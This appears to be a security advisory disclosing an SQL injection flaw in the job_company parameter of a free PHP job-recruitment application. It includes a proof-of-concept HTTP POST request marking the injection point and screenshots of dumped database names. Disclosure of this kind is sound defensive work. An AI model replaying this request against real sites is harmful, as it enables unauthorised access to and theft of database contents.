# job-recruitment-in-php has sql injection vulnerability in job_company parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
job_company parameter and add_xp function

## describe

An unrestricted SQL injection attack exists in a job-recruitmentsystem. The parameters that can be controlled are as follows: job_company. This function executes the job_company parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of $POST['job_company'] is obtained in add_xp action , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241223210717887](https://github.com/user-attachments/assets/fce0a239-b90a-4da4-842f-4b3700e29f87)

![image-20241223210752857](https://github.com/user-attachments/assets/ad13729c-2400-40cb-95e1-09905d392c2f)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=trffj4a18c7spv0k5me1qi7ni7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

action=add_xp&job_company=1*&job_nm=1
```

**Result**

![image-20241223210649258](https://github.com/user-attachments/assets/f125fb67-da47-4c77-9644-f16e184c9f57)

Get databases;

![image-20241225005108179](https://github.com/user-attachments/assets/7084d4b4-70df-43a0-80bb-cd2a7838e754)

**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤